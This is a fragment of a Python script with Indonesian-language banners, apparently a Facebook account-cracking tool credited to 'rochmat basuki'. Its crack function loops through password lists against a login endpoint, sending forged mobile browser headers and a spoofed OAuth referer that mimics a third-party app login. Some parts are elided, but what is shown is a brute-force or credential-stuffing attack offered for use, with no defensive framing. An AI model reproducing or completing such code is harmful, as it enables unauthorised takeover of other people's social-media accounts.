...
def logo(n):
 ...
 {U}selamat datang {M}{n}{hh}, script by {b}rochmat basuki{K} limited user""")
def logo2():
	return str(f"""  _   _ _______  _______    ____  _        _    ____  _____
 | \ | | ____\ \/ /_   _|  | __ )| |      / \  |  _ \| ____|
 |  \| |  _|  \  /  | |    |  _ \| |     / _ \ | | | |  _|
 | |\  | |___ /  \  | |    | |_) | |___ / ___ \| |_| | |___
 |_| \_|_____/_/\_\ |_|    |____/|_____/_/   \_\____/|_____|
 {B}selamat datang {M}user{P}, script by {hh}rochmat basuki{U} limited user""")
...
def crack(idf,pwx,url,awal):
	...
	for pw in pwx:
		try:
			...
			head = {'accept': '*/*','accept-encoding': 'gzip, deflate, br','accept-language': 'id,en-US;q=0.9,en;q=0.8','content-type': 'application/x-www-form-urlencoded','Host': url,'origin': 'https://'+url,'referer': 'https://m.facebook.com/login.php?skip_api_login=1&api_key=1862952583919182&kid_directed_site=0&app_id=1862952583919182&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv13.0%2Fdialog%2Foauth%3Fcct_prefetching%3D0%26client_id%3D1862952583919182%26cbt%3D1662696420399%26e2e%3D%257B%2522init%2522%253A1662696420399%257D%26ies%3D0%26sdk%3Dandroid-13.1.0%26sso%3Dchrome_custom_tab%26nonce%3D8d383bbe-7611-4b24-aaa9-5fcb2e345b37%26scope%3Dopenid%252Cpublic_profile%252C%2Buser_age_range%252C%2Bemail%252C%2Buser_friends%26state%3D%257B%25220_auth_logger_id%2522%253A%252256dc1eda-8806-4017-bb3c-01b9d50a7e27%2522%252C%25223_method%2522%253A%2522custom_tab%2522%252C%25227_challenge%2522%253A%2522cpa00hl9h320ua6ktm5f%2522%257D%26code_challenge_method%3DS256%26default_audience%3Dfriends%26login_behavior%3DNATIVE_WITH_FALLBACK%26redirect_uri%3Dfbconnect%253A%252F%252Fcct.com.ss.android.ugc.trill%26auth_type%3Drerequest%26response_type%3Did_token%252Ctoken%252Csigned_request%252Cgraph_domain%26return_scopes%3Dtrue%26code_challenge%3DS4c_BV4sLrudRRUHgmotjFURRY-sAt99hqjDg1iK0LA%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D56dc1eda-8806-4017-bb3c-01b9d50a7e27%26tp%3Dunspecified&cancel_url=fbconnect%3A%2F%2Fcct.com.ss.android.ugc.trill%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%25220_auth_logger_id%2522%253A%252256dc1eda-8806-4017-bb3c-01b9d50a7e27%2522%252C%25223_method%2522%253A%2522custom_tab%2522%252C%25227_challenge%2522%253A%2522cpa00hl9h320ua6ktm5f%2522%257D&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr','user-agent': ua,'sec-ch-ua': '"Google Chrome";v="89", "Chromium";v="89", ";Not A Brand";v="99"','sec-ch-ua-mobile': '?0','sec-fetch-dest': 'empty','sec-fetch-mode': 'cors','sec-fetch-site': 'same-origin','x-requested-with': 'XMLHttpRequest'}
